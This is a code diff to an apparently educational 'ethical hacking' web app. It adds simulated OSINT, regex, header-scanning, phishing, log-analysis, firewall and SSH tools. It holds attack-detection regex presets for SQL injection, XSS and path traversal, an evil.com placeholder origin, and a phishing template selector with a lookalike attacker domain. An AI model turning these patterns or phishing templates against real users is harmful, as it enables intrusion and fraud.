+     NEW TOOL 2: OSINT USERNAME RECON
+═══════════════════════════════════════════════════ -->
+<div class="tp" id="tab-osint">
+<div class="stitle purple">&#128270; OSINT USERNAME RECON</div>
+<div style="background:#0f001a;border:1px solid #aa44ff33;padding:7px 10px;margin-bottom:12px;font-size:10px;color:#aa44ff88">&#9672; Educational simulation. Check username presence across platforms (simulated).</div>
+<div class="g2">
+<div>
+<div class="fi"><label>TARGET USERNAME</label><input id="osint-user" placeholder="sandesh_hacker" style="border-color:#aa44ff33;background:#0a0010;color:#cc88ff"></div>
+<div class="fi"><label>SCAN TYPE</label><select id="osint-type" style="border-color:#aa44ff33;background:#0a0010;color:#cc88ff"><option value="social">SOCIAL MEDIA</option><option value="hacking">HACKING FORUMS</option><option value="dev">DEVELOPER PLATFORMS</option><option value="all">ALL PLATFORMS</option></select></div>
+<button class="btn btnp btnw" onclick="runOSINT()" id="osint-btn">&#128270; START OSINT SCAN</button>
+<div class="pbar" style="margin-top:7px;background:#1a001a"><div class="pfill" id="osint-prog" style="width:0%;background:var(--pu)"></div></div>
+<div style="font-size:9px;color:#aa44ff88;margin-top:3px" id="osint-status">READY</div>
+<div style="margin-top:14px">
+<div style="font-size:9px;color:#aa44ff88;margin-bottom:6px">EMAIL BREACH CHECK</div>
+<div class="fi"><label>EMAIL ADDRESS</label><input id="osint-email" placeholder="user@example.com" style="border-color:#aa44ff33;background:#0a0010;color:#cc88ff"></div>
+<button class="btn btnp btnw" onclick="osintEmail()">&#128231; CHECK EMAIL EXPOSURE</button>
+<div class="out purple-out" id="osint-email-out" style="font-size:10px;min-height:60px;margin-top:7px">...</div>
+</div>
+<div style="margin-top:10px">
+<div style="font-size:9px;color:#aa44ff88;margin-bottom:6px">GOOGLE DORK BUILDER</div>
+<div class="fi"><label>TARGET DOMAIN</label><input id="dork-domain" placeholder="example.com" style="border-color:#aa44ff33;background:#0a0010;color:#cc88ff"></div>
+<button class="btn btnp btnw" onclick="buildDorks()">&#128270; BUILD DORKS</button>
+<div class="out purple-out" id="dork-out" style="font-size:10px;min-height:70px;white-space:pre-line">...</div>
+</div>
+</div>
+<div>
+<div style="font-size:9px;color:#aa44ff88;margin-bottom:7px">PLATFORM RESULTS <span id="osint-count" style="color:var(--pu)"></span></div>
+<div id="osint-results" style="min-height:380px"><div style="color:#aa44ff33;font-size:11px;padding:16px;text-align:center">Enter username and scan</div></div>
+</div>
+</div>
+</div>
+ 
+<!-- ═══════════════════════════════════════════════════
+     NEW TOOL 3: REGEX TESTER
+═══════════════════════════════════════════════════ -->
+<div class="tp" id="tab-regex">
+<div class="stitle purple">&#128295; LIVE REGEX TESTER</div>
+<div style="background:#0f001a;border:1px solid #aa44ff33;padding:7px 10px;margin-bottom:12px;font-size:10px;color:#aa44ff88">&#9672; Test regex patterns live — useful for WAF bypass, input validation testing, and log parsing.</div>
+<div class="g2">
+<div>
+<div class="fi"><label>REGEX PATTERN</label><input id="rx-pattern" placeholder="(\b\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}\b)" oninput="runRegex()" style="border-color:#aa44ff33;background:#0a0010;color:#cc88ff;font-size:13px"></div>
+<div style="display:flex;gap:7px;margin-bottom:8px">
+<label style="display:flex;align-items:center;gap:4px;font-size:10px;cursor:pointer;color:#aa44ff88"><input type="checkbox" id="rx-i" onchange="runRegex()" style="accent-color:var(--pu)"> i</label>
+<label style="display:flex;align-items:center;gap:4px;font-size:10px;cursor:pointer;color:#aa44ff88"><input type="checkbox" id="rx-g" checked onchange="runRegex()" style="accent-color:var(--pu)"> g</label>
+<label style="display:flex;align-items:center;gap:4px;font-size:10px;cursor:pointer;color:#aa44ff88"><input type="checkbox" id="rx-m" onchange="runRegex()" style="accent-color:var(--pu)"> m</label>
+</div>
+<div class="fi"><label>TEST STRING</label><textarea id="rx-text" oninput="runRegex()" style="min-height:100px;border-color:#aa44ff33;background:#0a0010;color:#cc88ff" placeholder="192.168.1.1 connected from 10.0.0.5&#10;admin@example.com&#10;CVE-2024-1234">192.168.1.1 connected from 10.0.0.5
+admin@example.com logged in
+ERROR: CVE-2024-1234 exploit attempt from 203.0.113.42
+flag{secret_data_here}</textarea></div>
+<div style="font-size:10px;color:#aa44ff88;margin-top:6px" id="rx-stats">Matches: 0</div>
+<div style="margin-top:12px">
+<div style="font-size:9px;color:#aa44ff88;margin-bottom:6px">SECURITY REGEX PRESETS</div>
+<div style="display:flex;flex-direction:column;gap:5px">
+<button class="btn btnp btnw" style="text-align:left;font-size:10px" onclick="loadRx('(\\b\\d{1,3}\\.\\d{1,3}\\.\\d{1,3}\\.\\d{1,3}\\b)','IP Addresses')">&#9658; Match IP Addresses</button>
+<button class="btn btnp btnw" style="text-align:left;font-size:10px" onclick="loadRx('([a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\\.[a-zA-Z]{2,})','Email Addresses')">&#9658; Match Email Addresses</button>
+<button class="btn btnp btnw" style="text-align:left;font-size:10px" onclick="loadRx('(CVE-\\d{4}-\\d{4,7})','CVE IDs')">&#9658; Match CVE IDs</button>
+<button class="btn btnp btnw" style="text-align:left;font-size:10px" onclick="loadRx('(flag\\{[^}]*\\}|FLAG\\{[^}]*\\}|ctf\\{[^}]*\\})','CTF Flags')">&#9658; Match CTF Flags</button>
+<button class="btn btnp btnw" style="text-align:left;font-size:10px" onclick="loadRx(\"(\\\\')(\\\\s*)(or|OR)(\\\\s+)(\\\\d+=\\\\d+|'\\\\d+'='\\\\d+')\",'SQL Injection')">&#9658; Detect SQL Injection</button>
+<button class="btn btnp btnw" style="text-align:left;font-size:10px" onclick="loadRx('(&lt;script[^&gt;]*&gt;|&lt;img[^&gt;]*onerror|javascript:)','XSS Patterns')">&#9658; Detect XSS</button>
+<button class="btn btnp btnw" style="text-align:left;font-size:10px" onclick="loadRx('(\\.\\.\\/|\\.\\.\\\\\\\\ |%2e%2e%2f)','Path Traversal')">&#9658; Path Traversal</button>
+</div>
+</div>
+</div>
+<div>
+<div style="font-size:9px;color:#aa44ff88;margin-bottom:5px">HIGHLIGHTED MATCHES</div>
+<div id="rx-output" style="background:#0a0010;border:1px solid #aa44ff33;min-height:200px;padding:10px;font-size:12px;line-height:1.8;word-break:break-all;font-family:'Share Tech Mono',monospace;color:#cc88ff;white-space:pre-wrap"></div>
+<div style="margin-top:10px">
+<div style="font-size:9px;color:#aa44ff88;margin-bottom:5px">EXTRACTED MATCHES</div>
+<div class="out purple-out" id="rx-matches" style="min-height:100px;white-space:pre-line;font-size:11px">...</div>
+</div>
+<div style="margin-top:10px">
+<div style="font-size:9px;color:#aa44ff88;margin-bottom:5px">REGEX REPLACE</div>
+<div class="fi"><label>REPLACE WITH</label><input id="rx-replace" placeholder="[REDACTED]" oninput="runRegex()" style="border-color:#aa44ff33;background:#0a0010;color:#cc88ff"></div>
+<div class="out purple-out" id="rx-replaced" style="font-size:11px;min-height:50px">...</div>
+</div>
+</div>
+</div>
+</div>
+ 
+<!-- ═══════════════════════════════════════════════════
+     NEW TOOL 4: HTTP SECURITY HEADER SCANNER
+═══════════════════════════════════════════════════ -->
+<div class="tp" id="tab-headers">
+<div class="stitle purple">&#127760; HTTP SECURITY HEADER SCANNER</div>
+<div style="background:#0f001a;border:1px solid #aa44ff33;padding:7px 10px;margin-bottom:12px;font-size:10px;color:#aa44ff88">&#9672; Grade security headers and find misconfigurations. Educational simulation.</div>
+<div class="g2">
+<div>
+<div class="fi"><label>TARGET URL</label><input id="hdr-url" placeholder="https://example.com" style="border-color:#aa44ff33;background:#0a0010;color:#cc88ff"></div>
+<button class="btn btnp btnw" onclick="scanHeaders()" id="hdr-btn">&#127760; SCAN HEADERS</button>
+<div class="pbar" style="margin-top:7px;background:#1a001a"><div class="pfill" id="hdr-prog" style="width:0%;background:var(--pu)"></div></div>
+<div style="font-size:9px;color:#aa44ff88;margin-top:3px" id="hdr-status">READY</div>
+<div style="margin-top:12px">
+<div class="stitle" style="font-size:12px;color:var(--pu)">OVERALL GRADE</div>
+<div id="hdr-grade" style="text-align:center;padding:20px 0">
+<div style="font-family:'Orbitron',sans-serif;font-size:60px;color:#aa44ff33">?</div>
+</div>
+<div id="hdr-score-detail" style="font-size:10px;line-height:2"></div>
+</div>
+<div style="margin-top:12px">
+<div class="stitle" style="font-size:12px;color:var(--pu)">CORS CHECKER</div>
+<div class="fi"><label>ORIGIN TO TEST</label><input id="cors-origin" placeholder="https://evil.com" style="border-color:#aa44ff33;background:#0a0010;color:#cc88ff"></div>
+<button class="btn btnp btnw" onclick="checkCORS()">CHECK CORS</button>
+<div class="out purple-out" id="cors-out" style="font-size:10px;min-height:60px;margin-top:7px">...</div>
+</div>
+</div>
+<div>
+<div style="font-size:9px;color:#aa44ff88;margin-bottom:7px">HEADER ANALYSIS</div>
+<div id="hdr-results" style="min-height:400px"><div style="color:#aa44ff33;font-size:11px;padding:16px;text-align:center">Enter URL and scan</div></div>
+</div>
+</div>
+</div>
+ 
+<!-- ═══════════════════════════════════════════════════
+     NEW TOOL 5: PHISHING SIMULATOR
+═══════════════════════════════════════════════════ -->
+<div class="tp" id="tab-phishing">
+<div class="stitle purple">&#128231; PHISHING AWARENESS SIMULATOR</div>
+<div style="background:#1a0000;border:1px solid #ff003c33;padding:7px 10px;margin-bottom:12px;font-size:10px;color:#ff6666">&#9888; STRICTLY EDUCATIONAL. Simulates phishing techniques to improve awareness &amp; defense.</div>
+<div class="g2">
+<div>
+<div class="fi"><label>ATTACK TEMPLATE</label><select id="phish-type" onchange="buildPhish()" style="border-color:#aa44ff33;background:#0a0010;color:#cc88ff">
+<option value="login">Fake Login Page</option>
+<option value="invoice">Fake Invoice Email</option>
+<option value="it">IT Support Email</option>
+<option value="prize">Prize Winner Email</option>
+<option value="ceo">CEO Fraud (BEC)</option>
+<option value="verify">Account Verify SMS</option>
+</select></div>
+<div class="fi"><label>TARGET ORGANIZATION</label><input id="phish-org" value="ExampleCorp" oninput="buildPhish()" style="border-color:#aa44ff33;background:#0a0010;color:#cc88ff"></div>
+<div class="fi"><label>ATTACKER DOMAIN</label><input id="phish-domain" value="examp1e-corp.com" oninput="buildPhish()" style="border-color:#aa44ff33;background:#0a0010;color:#cc88ff"></div>
+<button class="btn btnp btnw" onclick="buildPhish()">&#128296; GENERATE TEMPLATE</button>
+<div style="margin-top:14px">
+<div class="stitle" style="font-size:12px;color:var(--pu)">RED FLAGS DETECTOR</div>
+<div class="fi"><label>PASTE SUSPICIOUS EMAIL/URL</label><textarea id="phish-detect" style="min-height:80px;border-color:#aa44ff33;background:#0a0010;color:#cc88ff" placeholder="Paste email text or URL here..."></textarea></div>
+<button class="btn btnp btnw" onclick="detectPhish()">&#128270; ANALYZE FOR RED FLAGS</button>
+<div id="phish-flags" style="margin-top:8px"></div>
+</div>
+</div>
+<div>
+<div style="font-size:9px;color:#aa44ff88;margin-bottom:7px">PHISHING TEMPLATE PREVIEW</div>
+<div id="phish-preview" style="background:#0a0010;border:1px solid #aa44ff33;min-height:300px;padding:14px;font-size:11px;line-height:1.9;color:#cc88ff;white-space:pre-wrap">Select template type...</div>
+<div style="margin-top:10px">
+<div style="font-size:9px;color:#aa44ff88;margin-bottom:6px">DEFENSE TIPS</div>
+<div id="phish-defense" style="font-size:10px;line-height:1.9;color:#00ff41bb"></div>
+</div>
+</div>
+</div>
+</div>
+ 
+<!-- ═══════════════════════════════════════════════════
+     NEW TOOL 6: LOG ANALYZER
+═══════════════════════════════════════════════════ -->
+<div class="tp" id="tab-logs">
+<div class="stitle purple">&#128203; SERVER LOG ANALYZER</div>
+<div style="background:#0f001a;border:1px solid #aa44ff33;padding:7px 10px;margin-bottom:12px;font-size:10px;color:#aa44ff88">&#9672; Parse Apache/Nginx logs, detect attacks, extract IPs, and find anomalies.</div>
+<div class="g2">
+<div>
+<div class="fi"><label>PASTE LOG DATA</label><textarea id="log-input" style="min-height:120px;border-color:#aa44ff33;background:#0a0010;color:#cc88ff;font-size:10px" placeholder="192.168.1.5 - - [01/Jan/2024:12:00:01] &quot;GET /index.php HTTP/1.1&quot; 200 1234&#10;10.0.0.5 - - [01/Jan/2024:12:00:02] &quot;POST /admin/login HTTP/1.1&quot; 403 512&#10;..."></textarea></div>
+<div class="fi"><label>LOG FORMAT</label><select id="log-format" style="border-color:#aa44ff33;background:#0a0010;color:#cc88ff"><option value="apache">APACHE / NGINX COMBINED</option><option value="auth">LINUX AUTH LOG</option><option value="generic">GENERIC / CUSTOM</option></select></div>
+<button class="btn btnp btnw" onclick="analyzeLogs()" id="log-btn">&#128203; ANALYZE LOGS</button>
+<div style="margin-top:10px">
+<button class="btn btnw" style="font-size:10px" onclick="loadSampleLogs()">LOAD SAMPLE LOGS</button>
+</div>
+<div style="margin-top:12px" id="log-stats"></div>
+</div>
+<div>
+<div class="ctab" id="log-tabs">
+<button class="ctabb active" onclick="showLogTab('summary',this)">SUMMARY</button>
+<button class="ctabb" onclick="showLogTab('attacks',this)">ATTACKS</button>
+<button class="ctabb" onclick="showLogTab('ips',this)">TOP IPs</button>
+<button class="ctabb" onclick="showLogTab('timeline',this)">TIMELINE</button>
+</div>
+<div id="log-summary" class="cpanel active" style="min-height:350px"><div style="color:#aa44ff33;padding:16px;text-align:center;font-size:11px">Paste logs and analyze</div></div>
+<div id="log-attacks" class="cpanel" style="min-height:350px"></div>
+<div id="log-ips" class="cpanel" style="min-height:350px"></div>
+<div id="log-timeline" class="cpanel" style="min-height:350px"></div>
+</div>
+</div>
+</div>
+ 
+<!-- ═══════════════════════════════════════════════════
+     NEW TOOL 7: FIREWALL RULE BUILDER
+═══════════════════════════════════════════════════ -->
+<div class="tp" id="tab-firewall">
+<div class="stitle purple">&#128737; IPTABLES FIREWALL RULE BUILDER</div>
+<div style="background:#0f001a;border:1px solid #aa44ff33;padding:7px 10px;margin-bottom:12px;font-size:10px;color:#aa44ff88">&#9672; Build iptables rules visually. Educational reference for Linux firewall configuration.</div>
+<div class="g2">
+<div>
+<div class="fi"><label>RULE ACTION</label><select id="fw-action" style="border-color:#aa44ff33;background:#0a0010;color:#cc88ff"><option value="ACCEPT">ACCEPT</option><option value="DROP">DROP</option><option value="REJECT">REJECT</option><option value="LOG">LOG</option></select></div>
+<div class="fi"><label>CHAIN</label><select id="fw-chain" style="border-color:#aa44ff33;background:#0a0010;color:#cc88ff"><option value="INPUT">INPUT</option><option value="OUTPUT">OUTPUT</option><option value="FORWARD">FORWARD</option></select></div>
+<div class="fi"><label>PROTOCOL</label><select id="fw-proto" style="border-color:#aa44ff33;background:#0a0010;color:#cc88ff"><option value="tcp">TCP</option><option value="udp">UDP</option><option value="icmp">ICMP</option><option value="all">ALL</option></select></div>
+<div class="fi"><label>SOURCE IP (optional)</label><input id="fw-src" placeholder="192.168.1.0/24 or 0.0.0.0/0" style="border-color:#aa44ff33;background:#0a0010;color:#cc88ff"></div>
+<div class="fi"><label>DEST IP (optional)</label><input id="fw-dst" placeholder="10.0.0.1 or any" style="border-color:#aa44ff33;background:#0a0010;color:#cc88ff"></div>
+<div class="fi"><label>PORT</label><input id="fw-port" placeholder="22, 80, 443, 8080:8090" style="border-color:#aa44ff33;background:#0a0010;color:#cc88ff"></div>
+<div class="fi"><label>INTERFACE (optional)</label><input id="fw-iface" placeholder="eth0, wlan0" style="border-color:#aa44ff33;background:#0a0010;color:#cc88ff"></div>
+<button class="btn btnp btnw" onclick="addFWRule()">&#43; ADD RULE</button>
+<div style="margin-top:12px;display:flex;gap:7px">
+<button class="btn btnw" style="font-size:10px" onclick="loadFWTemplate('web')">WEB SERVER</button>
+<button class="btn btnw" style="font-size:10px" onclick="loadFWTemplate('ssh')">SSH HARDENED</button>
+<button class="btn btnw" style="font-size:10px" onclick="loadFWTemplate('lockdown')">LOCKDOWN</button>
+</div>
+</div>
+<div>
+<div style="font-size:9px;color:#aa44ff88;margin-bottom:7px">GENERATED RULES <button class="btn btnp" style="font-size:9px;padding:2px 8px;float:right" onclick="clearFWRules()">CLEAR</button></div>
+<div id="fw-rules" style="min-height:200px"><div style="color:#aa44ff33;font-size:11px;padding:16px;text-align:center">Add rules above</div></div>
+<div style="margin-top:10px">
+<div style="font-size:9px;color:#aa44ff88;margin-bottom:5px">IPTABLES SCRIPT</div>
+<div class="out purple-out" id="fw-script" style="white-space:pre-line;min-height:100px;font-size:10px">...</div>
+<button class="btn btnp btnw" style="margin-top:7px" onclick="navigator.clipboard.writeText(document.getElementById('fw-script').textContent).then(()=>{event.target.textContent='COPIED!';setTimeout(()=>event.target.textContent='COPY SCRIPT',1400)})">&#x2398; COPY SCRIPT</button>
+</div>
+</div>
+</div>
+</div>
+ 
+<!-- ═══════════════════════════════════════════════════
+     NEW TOOL 8: SSH KEY GENERATOR
+═══════════════════════════════════════════════════ -->
+<div class="tp" id="tab-sshkey">
+<div class="stitle purple">&#128272; SSH KEY GENERATOR &amp; ANALYZER</div>
+<div style="background:#0f001a;border:1px solid #aa44ff33;padding:7px 10px;margin-bottom:12px;font-size:10px;color:#aa44ff88">&#9672; Generate SSH key pairs, analyze existing keys, and audit SSH configurations.</div>
+<div class="g2">
+<div>
+<div class="stitle" style="font-size:12px;color:var(--pu)">GENERATE KEY PAIR</div>
+<div class="fi"><label>KEY TYPE</label><select id="ssh-type" style="border-color:#aa44ff33;background:#0a0010;color:#cc88ff"><option value="rsa4096">RSA 4096-bit</option><option value="rsa2048">RSA 2048-bit</option><option value="ed25519">Ed25519 (Recommended)</option><option value="ecdsa">ECDSA P-256</option></select></div>
+<div class="fi"><label>COMMENT / EMAIL</label><input id="ssh-comment" placeholder="user@hostname" style="border-color:#aa44ff33;background:#0a0010;color:#cc88ff"></div>
+<button class="btn btnp btnw" onclick="generateSSHKey()">&#128272; GENERATE KEY PAIR</button>
+<div style="margin-top:10px" id="ssh-output"></div>
+<div style="margin-top:12px">
+<div class="stitle" style="font-size:12px;color:var(--pu)">SSH CONFIG AUDITOR</div>
+<div class="fi"><label>PASTE sshd_config</label><textarea id="ssh-config" style="min-height:100px;border-color:#aa44ff33;background:#0a0010;color:#cc88ff;font-size:10px" placeholder="PermitRootLogin yes&#10;PasswordAuthentication yes&#10;Port 22&#10;X11Forwarding yes&#10;..."></textarea></div>
+<button class="btn btnp btnw" onclick="auditSSHConfig()">&#128270; AUDIT CONFIG</button>
+</div>
+</div>
+<div>
+<div class="stitle" style="font-size:12px;color:var(--pu)">KEY ANALYSIS</div>
+<div id="ssh-analysis"><div style="color:#aa44ff33;font-size:11px;padding:16px;text-align:center">Generate or paste a key to analyze</div></div>
+<div style="margin-top:12px">
+<div class="stitle" style="font-size:12px;color:var(--pu)">SSH HARDENING CHECKLIST</div>
+<div id="ssh-checklist"></div>
+</div>
+<div style="margin-top:12px">
+<div class="stitle" style="font-size:12px;color:var(--pu)">SECURE sshd_config TEMPLATE</div>
+<button class="btn btnp btnw" onclick="genSSHConfigTemplate()">&#128203; GENERATE SECURE CONFIG</button>
+<div class="out purple-out" id="ssh-config-out" style="font-size:10px;white-space:pre-line;min-height:80px;margin-top:7px">...</div>
+</div>
+</div>
+</div>
+</div>
+ 
 <!-- GAME -->
 <div class="tp" id="tab-game">
 <div class="stitle">&#127918; FIREWALL BREAKER</div>
@@ -632,57 +933,55 @@ ARP:<span id="sarp">0</span> Total:<span id="stot">0</span>
 </div>
 </div>
 </div>
-
-</div>
-</div>
-
+ 
+</div><!-- end content -->
+</div><!-- end app -->
+ 
 <script>
+// ============================================================
+// UTILS
+// ============================================================
+function esc(s){return String(s).replace(/&/g,'&amp;').replace(/</g,'&lt;').replace(/>/g,'&gt;').replace(/"/g,'&quot;').replace(/'/g,'&#39;');}
+function lsG(k,d){try{const v=localStorage.getItem(k);return v!==null?JSON.parse(v):d;}catch(e){return d;}}
+function lsS(k,v){try{localStorage.setItem(k,JSON.stringify(v));}catch(e){}}
+function delay(ms){return new Promise(r=>setTimeout(r,ms));}
+ 
+// ============================================================
 // MATRIX RAIN
+// ============================================================
 const MC=document.getElementById('mc'),MX=MC.getContext('2d');let DR=[];
 function resC(){MC.width=window.innerWidth;MC.height=window.innerHeight;DR=Array(Math.floor(MC.width/14)).fill(1);}
 resC();window.addEventListener('resize',resC);
 const MCHARS='アイウエオカキクケコ0123456789ABCDEF<>/\\|{}[]';
 function drawM(){MX.fillStyle='rgba(0,0,0,0.04)';MX.fillRect(0,0,MC.width,MC.height);MX.fillStyle='#00ff41';MX.font='13px Share Tech Mono';DR.forEach((y,i)=>{const c=MCHARS[Math.floor(Math.random()*MCHARS.length)];MX.fillText(c,i*14,y*14);if(y*14>MC.height&&Math.random()>0.975)DR[i]=0;DR[i]++;});}
 setInterval(drawM,50);
-
-// UTILS
-function lsG(k,d){try{const v=localStorage.getItem(k);return v!==null?JSON.parse(v):d;}catch(e){return d;}}
-function lsS(k,v){try{localStorage.setItem(k,JSON.stringify(v));}catch(e){}}
-function delay(ms){return new Promise(r=>setTimeout(r,ms));}
-
-// ── FIX 1: safe HTML escaper used everywhere innerHTML touches user/CTF data ──
-function esc(s){
-  return String(s)
-    .replace(/&/g,'&amp;')
-    .replace(/</g,'&lt;')
-    .replace(/>/g,'&gt;')
-    .replace(/"/g,'&quot;')
-    .replace(/'/g,'&#39;');
-}
-
+ 
+// ============================================================
 // STATS
-let ST=lsG('seth5_stats',{s:0,p:0,c:0,a:0,g:0});
+// ============================================================
+let ST=lsG('seth6_stats',{s:0,p:0,c:0,a:0,g:0});
 function updST(){
   const keys=['s','p','c','a','g'],ids=['ss','sp','sc2','sa','sg'];
-  ids.forEach((id,i)=>document.getElementById(id).textContent=ST[keys[i]]);
-  lsS('seth5_stats',ST);
+  ids.forEach((id,i)=>{const el=document.getElementById(id);if(el)el.textContent=ST[keys[i]];});
+  lsS('seth6_stats',ST);
 }
-
+ 
+// ============================================================
 // LOGIN
-let CU=lsG('seth5_user','');
+// ============================================================
+let CU=lsG('seth6_user','');
 function setStat(m,col='#00eeff'){const e=document.getElementById('lst');e.style.color=col;e.textContent=m;}
 async function doLogin(){
-  const u=document.getElementById('lu').value.trim();
-  const p=document.getElementById('lp').value;
+  const u=document.getElementById('lu').value.trim(),p=document.getElementById('lp').value;
   if(!u||!p){setStat('[ ERROR: CREDENTIALS REQUIRED ]','#ff003c');return;}
-  for(const m of ['Authenticating...','Verifying credentials...','Loading modules...','[ ACCESS GRANTED ]']){setStat(m);await delay(380);}
-  CU=u;lsS('seth5_user',u);setTimeout(()=>launch(),150);
+  for(const m of ['Authenticating...','Verifying credentials...','Loading 8 new modules...','[ ACCESS GRANTED — v6.0 ]']){setStat(m);await delay(380);}
+  CU=u;lsS('seth6_user',u);setTimeout(()=>launch(),150);
 }
 async function gmailLogin(){
   setStat('Connecting Google OAuth...','#4285f4');await delay(600);
   setStat('Verifying token...','#4285f4');await delay(700);
   setStat('[ GMAIL AUTH SUCCESS ]','#00ff41');await delay(400);
-  CU='user@gmail.com';lsS('seth5_user','user@gmail.com');setTimeout(()=>launch(),150);
+  CU='user@gmail.com';lsS('seth6_user','user@gmail.com');setTimeout(()=>launch(),150);
 }
 function launch(){
   const L=document.getElementById('login'),A=document.getElementById('app');
@@ -690,18 +989,20 @@ function launch(){
   A.style.display='block';A.style.visibility='visible';A.style.opacity='1';
   document.getElementById('ub').textContent=esc(CU);
   window.scrollTo(0,0);updST();
-  setTimeout(()=>{startDash();buildThreats();buildExploits();buildOwasp();buildBreaches();buildCTF();updatePayload();},200);
+  setTimeout(()=>{startDash();buildThreats();buildExploits();buildOwasp();buildBreaches();buildCTF();updatePayload();buildSSHChecklist();},200);
 }
 function logout(){
-  lsS('seth5_user','');CU='';
+  lsS('seth6_user','');CU='';
   const L=document.getElementById('login'),A=document.getElementById('app');
   L.style.display='flex';L.style.visibility='visible';L.style.opacity='1';L.style.pointerEvents='auto';
   A.style.display='none';
   document.getElementById('lst').textContent='';
   document.getElementById('lu').value='';document.getElementById('lp').value='';
 }
-
+ 
+// ============================================================
 // TABS
+// ============================================================
 function showTab(id){
   document.querySelectorAll('.tp').forEach(p=>p.classList.remove('active'));
   document.querySelectorAll('.nb').forEach(b=>b.classList.remove('active'));
@@ -710,31 +1011,39 @@ function showTab(id){
   if(id==='term')initTerm();
   if(id==='game')initGame('medium');
   if(id==='nmap')initNMC();
+  if(id==='regex')runRegex();
+  if(id==='jwt'){}
   window.scrollTo(0,0);
 }
-
+ 
+// ============================================================
 // DASHBOARD
+// ============================================================
 const DLINES=[
-  {t:0,txt:'┌────────────────────────────────────────┐',c:''},
-  {t:70,txt:'│  SANDESH ETH-HACK SUITE v5.0           │',c:'s'},
-  {t:140,txt:'│  IP Tools · QR · Encoder · Claude AI   │',c:'s'},
-  {t:210,txt:'└────────────────────────────────────────┘',c:''},
+  {t:0,txt:'┌─────────────────────────────────────────────┐',c:''},
+  {t:70,txt:'│  SANDESH ETH-HACK SUITE v6.0                │',c:'s'},
+  {t:140,txt:'│  8 NEW TOOLS LOADED — JWT·OSINT·REGEX+MORE  │',c:'pu'},
+  {t:210,txt:'└─────────────────────────────────────────────┘',c:''},
   {t:350,txt:'[*] Booting modules...',c:'c'},
-  {t:480,txt:'[+] packet_analyzer........OK',c:'s'},
-  {t:610,txt:'[+] ctf_lab................OK',c:'s'},
-  {t:740,txt:'[+] darkweb_monitor........OK',c:'s'},
-  {t:870,txt:'[+] ip_tools...............OK',c:'s'},
-  {t:1000,txt:'[+] advanced_encoder.......OK',c:'s'},
-  {t:1130,txt:'[+] ai_claude..............OK',c:'s'},
-  {t:1260,txt:'[*] All systems GO. Welcome back, root.',c:'w'},
+  {t:480,txt:'[+] jwt_analyzer...........OK ★ NEW',c:'s'},
+  {t:580,txt:'[+] osint_username.........OK ★ NEW',c:'s'},
+  {t:680,txt:'[+] regex_tester...........OK ★ NEW',c:'s'},
+  {t:780,txt:'[+] header_scanner.........OK ★ NEW',c:'s'},
+  {t:880,txt:'[+] phishing_simulator.....OK ★ NEW',c:'s'},
+  {t:980,txt:'[+] log_analyzer...........OK ★ NEW',c:'s'},
+  {t:1080,txt:'[+] firewall_builder.......OK ★ NEW',c:'s'},
+  {t:1180,txt:'[+] ssh_key_gen............OK ★ NEW',c:'s'},
+  {t:1300,txt:'[*] All 25 modules active. Welcome, root.',c:'w'},
 ];
 let DD=false;
 function startDash(){
   if(DD)return;DD=true;
   const t=document.getElementById('dt');
   DLINES.forEach(l=>setTimeout(()=>{
-    const d=document.createElement('div');d.className='tl tl'+l.c;
-    d.textContent=l.txt;   // textContent — safe, no HTML injection
+    const d=document.createElement('div');
+    d.className='tl'+(l.c?' tl'+l.c:'');
+    d.textContent=l.txt;
+    if(l.c==='pu')d.style.color='var(--pu)';
     t.appendChild(d);t.scrollTop=t.scrollHeight;
   },l.t));
 }
@@ -742,43 +1051,42 @@ const THREATS=[
   {cls:'tc',i:'&#128163;',t:'CVE-2024-3400 PAN-OS RCE — CVSS 10.0 — CRITICAL'},
   {cls:'tc',i:'&#128163;',t:'CVE-2024-21762 FortiOS SSL VPN RCE — Active'},
   {cls:'th',i:'&#9888;',t:'CVE-2024-1708 ConnectWise Path Traversal — PoC'},
-  {cls:'th',i:'&#9888;',t:'CVE-2023-44487 HTTP/2 Rapid Reset — Patch now'},
-  {cls:'tm',i:'&#128203;',t:'Microsoft Patch Tuesday — 73 security fixes'},
-  {cls:'tl2',i:'&#9432;',t:'OpenSSL 3.3.0 released — upgrade recommended'},
+  {cls:'th',i:'&#9888;',t:'JWT alg:none bypass — Check your APIs NOW'},
+  {cls:'tm',i:'&#128203;',t:'SSH brute-force campaigns up 340% — Harden now'},
+  {cls:'tl2',i:'&#9432;',t:'Ed25519 keys now recommended over RSA-2048'},
 ];
-function buildThreats(){
-  document.getElementById('tf').innerHTML=THREATS.map(t=>
-    `<div class="thi ${esc(t.cls)}">${t.i}&nbsp;${esc(t.t)}</div>`
-  ).join('');
-}
-
+function buildThreats(){document.getElementById('tf').innerHTML=THREATS.map(t=>`<div class="thi ${esc(t.cls)}">${t.i}&nbsp;${esc(t.t)}</div>`).join('');}
+ 
+// ============================================================
 // TERMINAL
+// ============================================================
 let TH=[],TI=-1,TINit=false;
 const CMDS={
-  help:()=>[{c:'s',t:'help whoami id uname ifconfig ls netstat ps'},{c:'c',t:'nmap <h> ping <h> whois <d>'},{c:'c',t:'sqlmap nikto hydra gobuster hashcat'},{c:'c',t:'metasploit msfconsole airmon-ng clear'}],
+  help:()=>[{c:'s',t:'help whoami id uname ifconfig ls netstat ps'},{c:'c',t:'nmap <h> ping <h> whois <d>'},{c:'c',t:'sqlmap nikto hydra gobuster hashcat'},{c:'c',t:'metasploit msfconsole airmon-ng clear'},{c:'pu',t:'NEW: jwt-decode <token> | ssh-keygen | osint <user>'}],
   whoami:()=>[{c:'s',t:'root'}],
   id:()=>[{c:'s',t:'uid=0(root) gid=0(root) groups=0(root)'}],
   pwd:()=>[{c:'s',t:'/root'}],
-  'uname -a':()=>[{c:'s',t:'Linux kali 6.5.0-kali3-amd64 #1 SMP Debian 6.5.6-1kali1 x86_64 GNU/Linux'}],
-  ifconfig:()=>[{c:'s',t:'eth0: inet 192.168.1.100 netmask 255.255.255.0'},{c:'s',t:'wlan0: inet 192.168.1.102 netmask 255.255.255.0'},{c:'s',t:'tun0: inet 10.10.14.5 netmask 255.255.255.0 (VPN)'},{c:'s',t:'lo: inet 127.0.0.1 netmask 255.0.0.0'}],
-  ls:()=>[{c:'s',t:'Desktop Documents tools wordlists exploits payloads reports'}],
-  netstat:()=>[{c:'s',t:'tcp 192.168.1.100:52341 ESTABLISHED'},{c:'s',t:'tcp 0.0.0.0:22 LISTEN'},{c:'s',t:'tcp 0.0.0.0:4444 LISTEN'}],
